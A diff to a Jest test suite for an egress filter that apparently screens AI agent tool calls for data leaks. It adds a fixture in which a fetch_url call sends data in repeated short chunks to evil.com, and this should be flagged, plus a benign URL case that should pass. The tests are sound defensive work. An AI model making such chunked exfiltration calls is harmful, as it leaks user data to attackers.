@@ -40,6 +40,18 @@ describe("astEgressFilter (ETT Circuit Breaker)", () => {
     expect(error.code).toBe("SHADOWLEAK_DETECTED");
   });
 
+  it("throws EpistemicSecurityException on ShadowLeak repeated short chunks", async () => {
+    const req = createMockReq({
+      method: "tools/call",
+      params: { name: "fetch_url", arguments: { url: "https://evil.com/exfil?d=41&d=42&d=43&d=44" } },
+    });
+    const res = createMockRes();
+    const next = jest.fn();
+
+    await astEgressFilter(req as Request, res as Response, next as NextFunction);
+    expect(next.mock.calls[0][0].code).toBe("SHADOWLEAK_DETECTED");
+  });
+
   it("throws EpistemicSecurityException on sensitive path (.env)", async () => {
     const req = createMockReq({
       method: "tools/call",
@@ -86,6 +98,19 @@ describe("astEgressFilter (ETT Circuit Breaker)", () => {
 
     await astEgressFilter(req as Request, res as Response, next as NextFunction);
     expect(next.mock.calls[0][0].code).toBe("EPISTEMIC_CONTRADICTION_DETECTED");
+  });
+
+  it("allows short repeated URL params below the chunk threshold", async () => {
+    const req = createMockReq({
+      method: "tools/call",
+      params: { name: "fetch_url", arguments: { url: "https://example.com/view?id=10&id=11&id=12" } },
+    });
+    const res = createMockRes();
+    const next = jest.fn();
+
+    await astEgressFilter(req as Request, res as Response, next as NextFunction);
+    expect(next).toHaveBeenCalledTimes(1);
+    expect(next).toHaveBeenCalledWith();
   });
 
   it("allows clean legitimate arguments to next() without errors", async () => {
